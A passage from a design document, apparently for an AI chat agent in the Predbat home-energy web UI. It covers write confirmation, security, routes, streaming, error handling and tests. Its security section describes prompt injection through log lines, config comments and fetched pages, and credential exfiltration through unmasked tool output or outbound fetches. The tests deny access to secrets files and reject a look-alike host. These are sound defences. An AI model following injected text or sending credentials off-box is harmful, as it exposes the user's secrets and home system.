`build_snapshot(base)` so it can be tested against a stub without an LLM.

## 13. Write confirmation

When `chat_confirm_writes` is on and the model calls a tool with `writes: True`:

1. A `confirm` event is emitted carrying `call_id`, tool name and the decoded arguments.
2. The browser renders a card: *"Set `input_number.predbat_best_soc_keep` to 2.0"* with
   **Approve** and **Reject**.
3. The turn parks, polling `pending_confirm[call_id]["approved"]` every 0.2 s for up to 300 s.
4. `POST /chat/confirm` sets `approved` under the lock.
5. Approved → the tool executes normally. Rejected or timed out → the tool result becomes
   `{"success": false, "error": "User declined this change"}`.

Feeding a rejection back as an ordinary tool result, rather than aborting, lets the model
acknowledge it and offer an alternative — which is the behaviour a user expects from a refusal.

With the switch off, write tools execute directly and still emit `tool_start`/`tool_end`, so the
transcript always records what was changed.

A pending confirmation is dropped when its turn ends. `POST /chat/confirm` for an unknown or
expired `call_id`, or one belonging to a different conversation than the caller claims, returns
404 rather than silently succeeding.

Because a user can navigate away from the running conversation, a confirmation can be waiting in
a conversation nobody is looking at. The global `busy` banner therefore names the conversation
and links to it, and the list entry for a conversation with a pending confirmation is badged.

## 14. Security and privacy

### 14.1 Credentials must not reach OpenRouter

Chat output goes to a third party — OpenRouter, and through it whichever provider serves the
chosen model. `get_apps` accepts a `masked` argument that defaults to true but *can be set
false*, which over MCP is the user's own deliberate choice on their own machine. In chat it
would let the model ask for unmasked credentials and ship them off-box.

The chat projection therefore strips `masked` from `get_apps`' schema entirely
(`chat_omit_properties`), so the model cannot express the request. `_execute_get_apps` keeps its
existing default of `masked=True`, so the omitted property resolves to the safe value. A test
asserts the property is absent from `openai_tool_list()` and present in `mcp_tool_list()`.

`get_state` already filters through `DEBUG_EXCLUDE_LIST`, and `get_config`/`get_entities`
return Predbat's own settings, which hold no credentials.

### 14.2 Exfiltration

`fetch_url` is the one tool that can send data outward to an address the model chooses. Section
7.3 fences it with an allowlist, resolved-address checks and redirect re-validation. Those
controls exist for this reason specifically, not as generic hygiene, and the allowlist must not
be widened to a wildcard.

### 14.3 Source reading stays inside the source

`search_source` and `read_source` are restricted by an extension allowlist rather than by
directory, because `config_root` and the source directory can be the same path — the repository
even ships `apps/predbat/config/apps.yaml` — and the Storage cache lives under `config_root`
(section 7.2.1). `apps.yaml`, `secrets.yaml`, `predbat.log` and the token cache are therefore
unreachable through these tools on every install, leaving the masked `get_apps` and the filtered
`get_log` as the only routes to that content. That is the point: those two redact, and a raw
file read would not.

### 14.4 Disclosure

The Chat tab shows a dismissible banner on first use naming the destination — OpenRouter and
the selected model's provider — and stating that tool results, including log lines and
configuration, are sent there. The dismissal is stored in `localStorage`.

### 14.5 Network exposure

The Predbat web UI has no authentication, so anyone who can reach port 5052 can use the chat,
read every saved conversation, and spend the user's OpenRouter credit. This is the same exposure
the existing MCP caution documents, and `docs/components.md` will carry the equivalent warning
for chat. Saved conversations, and deleted ones lingering until expiry (section 10.4), make it
slightly worse than a transient chat would be, which is worth saying plainly in the docs.

### 14.6 Prompt injection

Tool results are data, and some of it — log lines, entity names, `apps.yaml` comments, source
comments and fetched web pages — is text the model could be steered by. Two privileged actions are reachable:
a Predbat write, which is behind the confirmation gate whose card shows the *actual* tool and
arguments rather than the model's description of them; and an outbound fetch, which is behind
the allowlist. The `chat_max_tool_rounds` cap bounds a runaway loop.

### 14.7 XSS

Model output is rendered as markdown, and so are conversation titles, which are derived from
model or user text. The renderer escapes HTML **first**, then applies a small fixed set of
transforms (fenced code, inline code, bold, italic, links, bullet and numbered lists, line
breaks). Fetched page text, returned source lines and `url_citation` URLs are escaped the same
way. No `innerHTML` of
unescaped text anywhere, and no external markdown library.

## 15. Web layer

Registered from `WebInterface.start()` via `self._register_chat_routes(app)`, mirroring the
existing `_register_annual_routes()` split so the routes can be asserted against a bare
`aiohttp.Application` in a test without opening a socket. Routes are registered only when
`components.get_component("chat")` is not None.

| Method | Path | Purpose |
| ------ | ---- | ------- |
| GET | `/chat` | The tab |
| GET | `/chat/conversations` | List non-deleted: `{id, title, updated, message_count, cost, pending_confirm}` plus the current `active` |
| POST | `/chat/conversations` | Create; returns the new `{id}` |
| POST | `/chat/rename` | `{id, title}` |
| POST | `/chat/delete` | `{id}`; sets the flag. **409** if that conversation has the active turn |
| GET | `/chat/history?conversation=<id>` | Full transcript, `usage_total` and model, for first paint |
| POST | `/chat/send` | `{conversation, message}` → `{turn_id}`; **409** if any turn is active |
| GET | `/chat/stream?conversation=<id>&cursor=N` | SSE from sequence `N` |
| POST | `/chat/confirm` | `{conversation, turn_id, call_id, approve}` |
| POST | `/chat/cancel` | `{turn_id}`; aborts the active turn |
| GET | `/chat/models` | Model catalogue for the picker |
| POST | `/chat/model` | `{conversation, id}`; **409** if that conversation is mid-turn |

An unknown or deleted `conversation` id returns 404 on every route that takes one.

### 15.1 SSE protocol

Frames are `id: <seq>\nevent: <type>\ndata: <json>\n\n`. The handler loops: read events after
the cursor under the lock, write those whose `conversation_id` is either the requested one or
`None` (global), `await asyncio.sleep(0.1)`. A comment heartbeat every 15 s keeps proxies from
closing an idle stream.

| Event | Scope | Payload |
| ----- | ----- | ------- |
| `user` | conversation | `{text}` |
| `delta` | conversation | `{text}` — assistant token chunk |
| `assistant` | conversation | `{text, sources}` — the completed message |
| `tool_start` | conversation | `{call_id, name, arguments}` |
| `tool_end` | conversation | `{call_id, name, ok, elapsed, preview}` |
| `confirm` | conversation | `{call_id, name, arguments}` |
| `confirm_result` | conversation | `{call_id, approved}` |
| `usage` | conversation | `{prompt_tokens, completion_tokens, cost, conversation_cost}` |
| `title` | conversation | `{title}` — from `set_chat_title` or the fallback |
| `error` | conversation | `{message}` |
| `done` | conversation | `{turn_id}` |
| `busy` | global | `{conversation_id, title, turn_id}` — lock the composer everywhere |
| `idle` | global | `{}` — unlock |
| `reload` | global | `{}` — the cursor predates the buffer; refetch |

Cursor replay rather than a live queue means two open browsers both follow the same turn, a
reload mid-turn resumes from where it left off, and switching conversations is just a new cursor
against the same buffer. The buffer is capped at 2000 events; a cursor older than the buffer's
base gets `reload`.

Global `busy`/`idle` events reach every browser regardless of which conversation it is viewing,
which is what makes "browse freely, sending locked" work.

### 15.2 Model picker

`GET /chat/models` fetches `{base_url}/models`, keeps only entries whose
`supported_parameters` contains `tools`, and returns `{id, name, prompt_price, completion_price}`
sorted by id. Cached through `storage.fetch_cached("chat", "models", ..., fresh_minutes=1440)`,
so the picker costs one request a day. If the fetch fails, the list degrades to the single
`apps.yaml` model and the dropdown notes that the catalogue is unavailable.

`POST /chat/model` sets the model **on that conversation** and persists it, so a cheap model can
be used for one thread and an expensive one for another. Switching mid-conversation is allowed
between turns and appends a visible note to the transcript. A "Use default" entry clears the
override back to `None`, meaning the `apps.yaml` value. That value is always offered even if it
is missing from the catalogue, so a provider with no `/models` endpoint
still works.

### 15.3 The tab

A conversation list down the left: title, relative updated time, cost, a badge for a pending
confirmation, and a **New chat** button; rename and delete on each row. The transcript to the
right, with a growing textarea below it — Enter to send, Shift+Enter for a newline — and a
footer showing the per-conversation model picker, turn tokens and cost, and conversation cost.

Tool calls render **collapsed**: a single line, *"called `get_plan`"*, with a disclosure
triangle revealing arguments and the JSON result. Confirmation cards render inline and expanded.
Web-search sources render as a compact list under the message that used them.

While a turn runs, the composer is disabled in every conversation and a banner reads
*"Replying in 'why is it charging at 3am'"* with a link that switches to it. Switching
conversations while a turn runs is unrestricted; the selection is client state, so it is a
history refetch plus a new SSE cursor.

Dark mode follows the existing `get_header_html()` mechanism. Nav: `<a href='./chat'>Chat</a>`
added to the menu bar in `web_helper.py`, emitted only when chat is enabled.
`get_header_html()` gains a `chat_enabled=False` keyword argument, set at its single production
call site (`apps/predbat/web.py:1698`) from `components.get_component("chat")`. The default
keeps the existing test call site valid.

## 16. Error handling

| Condition | Behaviour |
| --------- | --------- |
| 401 from the provider | `error` event naming the key to check |
| 402 | Surfaced verbatim; it means the account is out of credit |
| 429 | Retried with a longer first backoff, then reported. The original rule here ended the turn "so a user is never billed for a silent retry storm" - that reasoning was wrong: a 429 means the request was rejected, so no tokens were processed and nothing was billed. Retrying costs time, not money, and the three-attempt cap bounds it |
| Timeout / connection error | `error` event naming the endpoint; `count_errors` incremented so the Components tab reflects it |
| Model does not support tools | Detected at selection from the catalogue and refused with an explanation; if it slips through, the missing `tool_calls` simply yields a text answer |
| Tool raises | Caught per call; the exception text becomes the tool result so the model can react |
| Malformed tool arguments | Same path — reported to the model as a tool error |
| `fetch_url` rejected by the allowlist or address check | Plain tool error naming the rule that refused it |
| Docs index unfetchable | `search_docs` returns an error result; the turn continues |
| `read_source` path outside the source root, or an off-allowlist extension | Plain tool error naming the rule that refused it |
| `search_source` pattern too long or uncompilable | Plain tool error; no exception, no scan started |
| `chat_web_search` on with a non-OpenRouter base URL | One-time warning logged; the request is sent without the plugin |
| `send` while busy | 409 with `{"error": "busy", "conversation_id", "title"}` so the client can offer the jump link |
| Unknown or deleted conversation id | 404 on every route taking one |
| Storage write failure | Logged, `count_errors` incremented; the in-memory conversation survives so the turn is not lost |

Every error path ends the turn cleanly, clears `active`, and emits both `done` and the global
`idle`.

## 17. Testing

New tests, registered in `TEST_REGISTRY` in `apps/predbat/unit_test.py`.

**`tests/test_agent_tools.py`**

- Every `TOOL_DEFS` name resolves to a handler on `PredbatTools`, and every handler is listed.
- `writes` is `True` for exactly `set_config` and `set_plan_override`.
- `mcp_tool_list()` matches a golden copy of the list `web_mcp.py` publishes today.
- `openai_tool_list()` is well-formed OpenAI function-calling shape, for both def lists.
- `masked` is absent from the chat projection of `get_apps` and present in the MCP projection.
- `CHAT_TOOL_DEFS` names do not appear in `mcp_tool_list()`.
- `execute()` dispatches correctly and returns the unknown-tool error for a bad name.
- `MCPServerWrapper` still exposes the inherited `_execute_*` methods.

**`tests/test_chat_store.py`**

- Create, rename, delete; ids are hex and unique.
- Save passes an expiry `chat_expiry_days` ahead, and a later save renews it.
- A deleted conversation is hidden from the list, 404s by id, and is not re-saved.
- Index self-heal when a body `load()` returns `None`.
- Unknown `version` in index or body is discarded, not half-parsed.
- LRU eviction flushes a dirty body before dropping it.
- `chat_max_conversations` marks the least recently updated deleted, never the active one, and
  deleted ones do not count toward the cap.
- History trimming stops at a `user` boundary and never orphans a `tool` message.

**`tests/test_chat_tools.py`**

- Allowlist: exact host and `.suffix` match accepted; `evilspringfall2008.github.io` rejected.
- Non-https rejected; private, loopback, link-local and reserved resolved addresses rejected.
- Redirect to an off-allowlist host rejected; hop limit enforced.
- Content-type and 200 KB size cap, with the truncation note.
- `search_docs` scoring, `max_results` clamping, URL construction from `location`, excerpt
  extraction, and the cached-index path (one fetch, two searches).
- Docs index unavailable → error result, no exception.
- `search_source` finds a known symbol in a known file, respects `max_results`, reports
  `total_matches` when truncated, and skips `venv/` and `__pycache__/`.
- `search_source` rejects an over-long pattern and an uncompilable one without raising.
- `read_source` returns the requested slice with `total_lines`, clamps `max_lines`, and pages.
- `read_source` accepts each allowlisted extension and refuses a `../` traversal, a symlink
  pointing outside the source root, and any off-allowlist extension — specifically `apps.yaml`,
  `secrets.yaml`, `predbat.log`, `cache/*.json`, a `.bak` and a `.so` placed in the source
  directory, which is the case that matters when `config_root` coincides with it.
- `search_source` matches inside a `.cpp` and a `.md` as well as a `.py`, and never reports a
  hit from an off-allowlist file.

**`tests/test_chat.py`** — driving `ChatAgent` against a fake OpenRouter that replays canned SSE
byte streams:

- Component gating: missing key, missing model, both present.
- Plain answer with no tool call; one tool call; chained tool calls.
- `chat_max_tool_rounds` cap reached → visible note, no infinite loop, and every refused call answered so the stored conversation stays replayable.
- Tool raising an exception, and malformed tool-call argument JSON.
- Write with confirm on: approved, rejected, timed out. Confirm off: executes directly.
- `set_chat_title` sets and emits; over-length truncated; empty rejected; the first-user-message
  fallback fires only when the model never called it.
- The title instruction appears in the system prompt only while untitled.
- `chat_web_search` on adds `plugins` to the body; off omits it; non-OpenRouter base URL warns once.
- `url_citation` annotations are collected onto the assistant message.
- `build_snapshot()` against a stub base, including missing/None fields.
- A turn in conversation A leaves B readable; `run_turn` on B while A is active raises Busy.
- Events carry the right `conversation_id`; `busy`/`idle` are global and always paired.
- 401, 429 and timeout responses produce the documented `error` events, and `idle` always follows.

**`tests/test_web_chat.py`**

- Routes register on a bare `aiohttp.Application` when chat is enabled, and do not when it is not.
- The nav link appears only when `chat_enabled=True`.
- `/chat/send` returns 409 with the active conversation's title while a turn runs.
- `/chat/delete` returns 409 for the active conversation.
- Unknown or deleted conversation id → 404 on each route taking one.
- SSE framing: `id`/`event`/`data` lines, conversation filtering, global events reaching a
  browser viewing another conversation, cursor replay, `reload` when the cursor is too old.
- `/chat/confirm` with an unknown `call_id`, or the wrong conversation, returns 404.
- `/chat/models` filters to tool-capable models and always includes the `apps.yaml` model.
- The markdown renderer escapes HTML before transforming, for messages, titles and source URLs.

**Regression:** `./run_all --test web_mcp` must pass unchanged after the extraction.

## 18. Implementation order

1. Extract `agent_tools.py`; refactor `web_mcp.py`; prove `test_web_mcp` is green and the golden
   tool list is unchanged.
2. `chat_store.py`: index, bodies, LRU, persistence with expiry, the deleted flag, pruning,
   trimming.
3. `chat_tools.py`: `search_docs`, `search_source`, `read_source`, and `fetch_url` with its
   allowlist and address guards.
4. `ChatAgent`: config, the agentic loop, snapshot, streaming, chat-local tools, against a fake
   OpenRouter.
5. Confirmation gate, `chat_confirm_writes` and `chat_web_search`.
6. `web_chat.py` routes and SSE.
7. The tab's HTML, CSS and client JS, including the conversation list.
8. Model picker.
9. Documentation.

Steps 1 to 5 are independently useful and independently testable; the feature is not visible to
a user until step 6.

## 19. Out of scope

- Per-user history or any access control on who sees which conversation.
- Authentication for the web UI.
- Undelete in the UI, though the flag makes it easy to add.
- Concurrent turns, or queueing a message in one conversation while another is running.
- Arbitrary web browsing beyond the `fetch_url` allowlist.
- Image, file or debug-YAML upload into the conversation.
- Search across conversations, or exporting one.
- Writing to Predbat's source, or running arbitrary code.
- Letting the agent define new tools.
- Reading source from a branch or release other than the installed one, except by fetching it
  from GitHub through `fetch_url`.
- Shipping `docs/` with the installer so documentation search can work offline (section 7.1).
- MCP client mode (the chat agent consuming *external* MCP servers).
- Voice input, or a Home Assistant conversation-agent integration.

## 20. Documentation

- `docs/components.md`: a new "AI Chat Agent (chat)" section — what it does, when to enable,
  the configuration table, the network-exposure and third-party-data cautions, the note that
  conversations are stored on disk and that a deleted one lingers until it expires, the cost of
  `chat_web_search`, the note that the agent can read its own installed source but not
  `apps.yaml` or the log through those tools, and the tool table cross-referenced to the MCP one.
- `docs/web-interface.md`: the Chat tab, conversations, the confirmation gate, the model picker.
- `docs/apps-yaml.md`: the ten new keys.
- New words to `.cspell/custom-dictionary-workspace.txt`: `openrouter`, `ollama`, `litellm`
  and anything else the hook flags (the file is auto-sorted on commit, so re-stage after).
